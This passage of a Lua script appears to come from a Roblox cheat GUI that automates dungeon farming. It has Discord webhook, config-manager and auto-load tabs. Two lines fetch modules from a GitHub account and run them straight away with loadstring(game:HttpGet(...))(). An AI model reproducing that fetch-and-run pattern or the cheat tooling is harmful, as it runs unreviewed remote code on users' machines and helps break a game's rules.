                        para2:SetDesc(formatNumberWithCommas(r) .. " /min")
                    end
                end
                
                para1:SetDesc(formatNumberWithCommas(b2 - b1))
                para3:SetDesc(formatNumberWithCommas(b2))
                para6:SetDesc(formatNumberWithCommas(b2 - csGold))
            end
            
            -- Time updates
            para4:SetDesc(timeElapsed(tick() - g))
            para5:SetDesc(timeElapsed(tick() - csTime))
            
            task.wait(1)
        end
    end)
end

-- Gọi function
createStatsTab()
end -- End Stats Tab scope
-- ============== KẾT THÚC STATS TAB ==============
-- ============================================
-- WEBHOOK UI - OPTIMIZED (ZERO LOCAL VARS)
-- Thêm vào Tab2 sau dòng ~5705
-- ============================================
do
    local Tabwebhook = Window:Tab({
    Title = "Webhook",
    Icon = "webhook", -- hoặc "bell", "send" 
    Locked = false,
})
    
    Tabwebhook:Paragraph({
        Title = "Discord Webhook Integration",
        Description = "Get notifications about missions, drops, and important events"
    })
    
    Tabwebhook:Divider({ Text = "Webhook URLs" })
    
    -- Mission Webhook
    ConfigSystem.registerUIElement("dungeonHook", Tabwebhook:Input({
        Title = "Mission Webhook",
        Description = "Webhook to log mission completions/fails",
        Placeholder = "https://discord.com/api/webhooks/...",
        Value = "",
        Callback = function(value)
            Options.dungeonHook:SetValue(value)
        end
    }))
    
    -- Drop Webhook
    ConfigSystem.registerUIElement("drophook", Tabwebhook:Input({
        Title = "Drop Webhook",
        Description = "Webhook to log T5 legendary drops",
        Placeholder = "https://discord.com/api/webhooks/...",
        Value = "",
        Callback = function(value)
            Options.drophook:SetValue(value)
        end
    }))
    
    Tabwebhook:Divider({ Text = "Webhook Settings" })
    
    -- Role ID
    ConfigSystem.registerUIElement("dropHookRoleId", Tabwebhook:Input({
        Title = "Custom Role ID",
        Description = "Role ID to ping (instead of @everyone)",
        Placeholder = "123456789012345678",
        Value = "",
        Callback = function(value)
            Options.dropHookRoleId:SetValue(value)
        end
    }))
    
    -- Anonymous Toggle
    ConfigSystem.registerUIElement("anonHook", Tabwebhook:Toggle({
        Title = "Anonymous Webhook",
        Desc = "Hide user info in webhook messages",
        Icon = "user-x",
        Type = "Checkbox",
        Default = false,
        Callback = function(state)
            Toggles.anonHook:SetValue(state)
        end
    }))
    
    Tabwebhook:Divider({ Text = "Test Webhooks" })
    
    -- Test Mission Webhook
    Tabwebhook:Button({
        Title = "Test Mission Webhook",
        Description = "Send test message to mission webhook",
        Callback = function()
            if Options.dungeonHook.Value and #Options.dungeonHook.Value > 30 then
                pcall(function()
                    local msg = "🧪 **Test Webhook**\n✅ Webhook test successful!\n" .. f
                    if Toggles.anonHook.Value then
                        anonHook(Options.dungeonHook.Value, "Mission Test", msg, 0x00FF00, utcDateAndTime())
                    else
                        hookWithUserInfo(Options.dungeonHook.Value, "Mission Test", msg, 0x00FF00, utcDateAndTime())
                    end
                end)
                WindUI:Notify({ Title = "Success", Content = "Mission webhook test sent!", Duration = 3 })
            else
                WindUI:Notify({ Title = "Error", Content = "Invalid webhook URL!", Duration = 3 })
            end
        end
    })
    
    -- Test Drop Webhook
    Tabwebhook:Button({
        Title = "Test Drop Webhook",
        Description = "Send test message to drop webhook",
        Callback = function()
            if Options.drophook.Value and #Options.drophook.Value > 30 then
                pcall(function()
                    local msg = "🧪 **Test Drop**\n💎 T5 Legendary Test\n" .. f
                    if Toggles.anonHook.Value then
                        anonHook(Options.drophook.Value, "Drop Test", msg, 0xFFD700, utcDateAndTime())
                    else
                        hookWithUserInfo(Options.drophook.Value, "Drop Test", msg, 0xFFD700, utcDateAndTime())
                    end
                end)
                WindUI:Notify({ Title = "Success", Content = "Drop webhook test sent!", Duration = 3 })
            else
                WindUI:Notify({ Title = "Error", Content = "Invalid webhook URL!", Duration = 3 })
            end
        end
    })

    Tabwebhook:Divider({ Text = "Guide" })

    -- Guide
    Tabwebhook:Paragraph({  -- ✅ ĐÚNG:Paragraph({
        Title = "How to get Webhook URL",
        Description = [[
1. Mở Discord > Server Settings
2. Integrations > Webhooks
3. Create Webhook hoặc chọn webhook có sẵn
4. Copy Webhook URL
5. Paste vào ô input bên trên

Để lấy Role ID:
1. Discord > User Settings > Advanced > Enable Developer Mode
2. Right-click role > Copy ID
        ]]
    })
end
_G.WindUI = WindUI
_G.Window = Window
_G.PlayerLocal = c
_G.UserId = d
_G.HttpService = e
_G.TeleportService = game:GetService("TeleportService")
_G.CurrentDungeon = aC
_G.CurrentDungeonId = ay
_G.CurrentDifficulty = az
_G.DungeonsList = ce
_G.WorldsList = cc
_G.ToggleStates = ToggleStates
_G.Toggles = Toggles
_G.Options = Options
_G.OptionValues = OptionValues
_G.ConfigSystem = ConfigSystem
_G.ConfigAutoLoaded = ConfigAutoLoaded
_G.GearPerks = bQ  -- ✅ Export perk data cho module
_G.ItemsModule = bR  -- ✅ Export items data cho module

-- ✅ Load Auto Party Module từ GitHub
do
    local AutoPartyModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/pritamadhikary1100-cell/hoiNhom/refs/heads/main/parti"))()
    AutoPartyModule:Init()
end

-- ✅ Load Auto Hatch Module từ GitHub
do
    local AutoHatchModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/pritamadhikary1100-cell/apTrung/refs/heads/main/trung"))()
    AutoHatchModule:Init()
end
-- ============== CONFIG TAB (Ở CUỐI) ==============
do -- Wrap để tránh local limit
local ConfigTab = Window:Tab({
    Title = "Config Manager",
    Icon = "settings",
    Locked = false
})
ConfigTab:Section({Title = "Config Manager"})

ConfigTab:Paragraph({
    Title = "ℹ️ Guide",
    Description = "• Enter new config name OR select from dropdown\n• Save: Save settings (auto refresh dropdown)\n• Load: Apply selected config\n• Delete: Delete config (auto refresh dropdown)\n• Refresh: Manually update dropdown"
})

-- Paragraph hiển thị config đang chọn
local ConfigStatusParagraph = ConfigTab:Paragraph({
    Title = "📁 Current Selection",
    Description = "None"
})
-- ✅ THÊM: Paragraph hiển thị autoload config
local AutoloadStatusParagraph = ConfigTab:Paragraph({
    Title = "🚀 Current Autoload",
    Description = "None"
})
-- ✅ THÊM: Biến lưu autoload config
ConfigSystem.autoloadConfig = ""
-- ✅ THÊM: Load autoload setting từ file
local autoloadSettingFile = ConfigSystem.ConfigFolder .. "/_autoload.txt"
if isfile and isfile(autoloadSettingFile) then
    local success, content = pcall(function()
        return readfile(autoloadSettingFile)
    end)
    if success and content and content ~= "" then
        ConfigSystem.autoloadConfig = content
        AutoloadStatusParagraph:SetDesc("🚀 " .. content)
    end
end
-- Input để tạo config mới
ConfigTab:Input({
    Title = "New Config Name",
    Description = "Enter new config name",
    Placeholder = "MyConfig",
    Value = "",
    Callback = function(value) 
        if value ~= "" then
            ConfigSystem.selectedConfig = value
            ConfigStatusParagraph:SetDesc("🆕 New: " .. value)
        end
    end
})

-- Load danh sách configs
local existingConfigs = ConfigSystem.getConfigList()
if #existingConfigs == 0 then
    existingConfigs = {"[Chưa có config - Tạo mới trước]"}
end

-- Dropdown chọn config (lưu reference)
ConfigSystem.dropdownRef = ConfigTab:Dropdown({
    Title = "📋 Select Config",
    Description = "Select config to load or delete",
    Values = existingConfigs,
    Multi = false,
    Callback = function(selected)
        if not selected:match("^%[") then
            ConfigSystem.selectedConfig = selected
            ConfigStatusParagraph:SetDesc("✅ Selected: " .. selected)
        end
    end
})
-- ✅ THÊM: Dropdown chọn autoload config
ConfigSystem.autoloadDropdownRef = ConfigTab:Dropdown({
    Title = "🚀 Select Autoload Config",
    Description = "This config will auto-load when script starts",
    Values = existingConfigs,
    Multi = false,
    Callback = function(selected)
        if not selected:match("^%[") then
            ConfigSystem.autoloadConfig = selected
            AutoloadStatusParagraph:SetDesc("🚀 " .. selected)
            
            -- Lưu vào file
            if not isfolder(ConfigSystem.ConfigFolder) then 
                makefolder(ConfigSystem.ConfigFolder) 
            end
            writefile(autoloadSettingFile, selected)
            
            WindUI:Notify({
                Title = "✅ Autoload Set!",
                Content = "Config '" .. selected .. "' will auto-load on script restart",
                Duration = 4
            })
        end
    end
})
ConfigTab:Divider({Text = "Actions"})

-- Button Refresh
ConfigTab:Button({
    Title = "🔄 Refresh",
    Description = "Update config list",
    Callback = function()
        local configs = ConfigSystem.refreshDropdown()
        local realConfigs = {}
        for _, name in ipairs(configs) do
            if not name:match("^%[") then
                table.insert(realConfigs, name)
            end
        end
        
        if #realConfigs == 0 then
            WindUI:Notify({
                Title = "📭 No Configs",
                Content = "No configs yet!\n\n💡 Create new:\n1. Enter name\n2. Click Save",
                Duration = 5
            })
        else
            local list = "📋 **" .. #realConfigs .. " config(s):**\n\n"
            for i, name in ipairs(realConfigs) do
                list = list .. i .. ". " .. name .. "\n"
            end
            
            WindUI:Notify({
                Title = "✅ Refreshed!",
                Content = list,
                Duration = 5
            })
        end
    end
})

-- Button Save
ConfigTab:Button({
    Title = "💾 Save Config",
    Description = "Save current settings",
    Callback = function()
        if ConfigSystem.selectedConfig == "" or ConfigSystem.selectedConfig:match("^%[") then
            WindUI:Notify({
                Title = "⚠️ Error",
                Content = "Please enter a new config name\nOR select an existing config!",
                Duration = 4
            })
            return
        end
        
        local success, err = pcall(function()
            local data = ConfigSystem.getConfigData()
            local encoded = ConfigSystem.serializeTable(data)
            if not isfolder(ConfigSystem.ConfigFolder) then makefolder(ConfigSystem.ConfigFolder) end
            writefile(ConfigSystem.ConfigFolder .. "/" .. ConfigSystem.selectedConfig .. ".txt", encoded)
        end)
        
        if success then
            WindUI:Notify({
                Title = "✅ Saved!",
                Content = "📁 " .. ConfigSystem.selectedConfig,
                Duration = 3
            })
            
            -- Tự động refresh dropdown sau khi save
            task.delay(0.2, function()
                ConfigSystem.refreshDropdown()
            end)
        else
            WindUI:Notify({
                Title = "❌ Save Failed",
                Content = tostring(err),
                Duration = 4
            })
        end
    end
})

-- Button Load
ConfigTab:Button({
    Title = "📂 Load Config",
    Description = "Apply selected config (including party config)",
    Callback = function()
        if ConfigSystem.selectedConfig == "" or ConfigSystem.selectedConfig:match("^%[") then
            WindUI:Notify({
                Title = "⚠️ Error",
                Content = "Please select a config from the dropdown!",
                Duration = 4
            })
            return
        end
        
        local success, err = pcall(function()
            local path = ConfigSystem.ConfigFolder .. "/" .. ConfigSystem.selectedConfig .. ".txt"
            if not isfile(path) then error("Config không tồn tại") end
            
            local fileContent = readfile(path)
            local data = ConfigSystem.deserializeTable(fileContent)
            if not data then error("Config lỗi") end
            
            -- ✅ Load config chính
            ConfigSystem.loadConfigData(data)
            
            -- ✅ THÊM: Load party config ngay sau đó
            task.delay(0.5, function()
                pcall(function()
                    if _G.loadPartyConfigGlobal then
                        _G.loadPartyConfigGlobal()
                        -- Party config loaded
                    end
                end)
            end)
            
            -- Debug log
            warn("=== CONFIG LOADED ===")
            warn("Config:", ConfigSystem.selectedConfig)
            warn("Autofarm:", ToggleStates.Autofarm)
            warn("AutoAcceptInvite:", ToggleStates.AutoAcceptInvite)
            warn("Offset:", OptionValues.Offset)
            warn("====================")
        end)
        
        if success then
            WindUI:Notify({
                Title = "✅ Loaded!",
                Content = "📁 " .. ConfigSystem.selectedConfig .. "\n\n✨ Settings + Party config have been applied!",
                Duration = 4
            })
        else
            WindUI:Notify({
                Title = "❌ Load Failed",
                Content = tostring(err),
                Duration = 5
            })
        end
    end
})

-- Button Delete
ConfigTab:Button({
    Title = "🗑️ Delete Config",
    Description = "Delete selected config",
    Callback = function()
        if ConfigSystem.selectedConfig == "" or ConfigSystem.selectedConfig:match("^%[") then
            WindUI:Notify({
                Title = "⚠️ Error",
                Content = "Please select a config to delete!",
                Duration = 3
            })
            return
        end
        
        local success, err = pcall(function()
            local path = ConfigSystem.ConfigFolder .. "/" .. ConfigSystem.selectedConfig .. ".txt"
            if not isfile(path) then error("Config không tồn tại") end
            delfile(path)
        end)
        
        if success then
            local deletedName = ConfigSystem.selectedConfig
            ConfigSystem.selectedConfig = ""
            ConfigStatusParagraph:SetDesc("None")
            
            WindUI:Notify({
                Title = "✅ Deleted!",
                Content = "🗑️ " .. deletedName,
                Duration = 3
            })
            
            -- Tự động refresh dropdown sau khi delete
            task.delay(0.2, function()
                ConfigSystem.refreshDropdown()
            end)
        else
            WindUI:Notify({
                Title = "❌ Delete Failed",
                Content = tostring(err),
                Duration = 3
            })
        end
    end
})

end -- End Config Tab scope

-- ============== DISCORD TAB ==============
local DiscordTab = Window:Tab({
    Title = "Community",
    Icon = "message-circle",
    Locked = false
})

DiscordTab:Section({Title = "Discord Server"})

DiscordTab:Button({
    Title = "💬 Copy Discord Link",
    Description = "Click to copy Discord invite link to clipboard",
    Callback = function()
        setclipboard("https://discord.gg/f9DrdRKauT")
        WindUI:Notify({
            Title = "✅ Copied!",
            Content = "Discord link copied to clipboard",
            Duration = 3
        })
    end
})

-- Biến flag cho config auto-load
local ConfigAutoLoaded = false

-- ============== AUTO-LOAD CONFIG ==============
task.spawn(function()
    -- ✅ Đợi 1.5 giây cho UI render (giảm từ 3s)
    task.wait(1.5)
    
    -- Đọc autoload config setting
    local autoloadSettingFile = ConfigSystem.ConfigFolder .. "/_autoload.txt"
    local configToLoad = ""
    
    if isfile and isfile(autoloadSettingFile) then
        local success, content = pcall(function()
            return readfile(autoloadSettingFile)
        end)
        if success and content and content ~= "" then
            configToLoad = content
        end
    end
    
    -- Nếu không có autoload setting, thử load "default"
    if configToLoad == "" then
        configToLoad = "default"
    end
    
    -- Load config
    local configPath = ConfigSystem.ConfigFolder .. "/" .. configToLoad .. ".txt"
    if isfile and isfile(configPath) then
        local success, err = pcall(function()
            local fileContent = readfile(configPath)
            local data = ConfigSystem.deserializeTable(fileContent)
            
            if data then
                ConfigSystem.loadConfigData(data)
                ConfigSystem.selectedConfig = configToLoad
                
                -- Cập nhật UI
                pcall(function()
                    if ConfigStatusParagraph then
                        ConfigStatusParagraph:SetDesc("✅ Auto-loaded: " .. configToLoad)
                    end
                    if AutoloadStatusParagraph then
                        AutoloadStatusParagraph:SetDesc("🚀 " .. configToLoad)
                    end
                end)
                
                WindUI:Notify({
                    Title = "🎯 Auto Config",
                    Content = "Auto-loaded: " .. configToLoad .. "\n+ Party config",
                    Duration = 4
                })
                
                warn("=== AUTO-LOAD SUCCESS ===")
                warn("Config:", configToLoad)
                warn("Autofarm:", Toggles.Autofarm.Value)
                warn("Offset:", Options.Offset.Value)
                warn("Party config sẽ load sau 1s...")
                warn("=======================")
                
                -- Set flag ConfigAutoLoaded
                ConfigAutoLoaded = true
                
                -- Debug: Kiểm tra giá trị timer sau khi load
                warn("[DEBUG] Timer values after config load:")
                warn("  dungeonStartTimer:", Options.dungeonStartTimer.Value)
                warn("  towerStartTimer:", Options.towerStartTimer.Value)
                warn("  Note: Timer = 0 means skip delay and start farming immediately")
            else
                warn("Failed to deserialize config")
            end
        end)
        
        if not success then
            warn("Auto-load error:", err)
            WindUI:Notify({
                Title = "⚠️ Auto-load Failed",
                Content = tostring(err),
                Duration = 5
            })
        end
    else
        warn("No config file found:", configPath)
        if configToLoad ~= "default" then
            WindUI:Notify({
                Title = "ℹ️ No Autoload Config",
                Content = "Config '" .. configToLoad .. "' does not exist.",
                Duration = 5
            })
        end
    end
end)
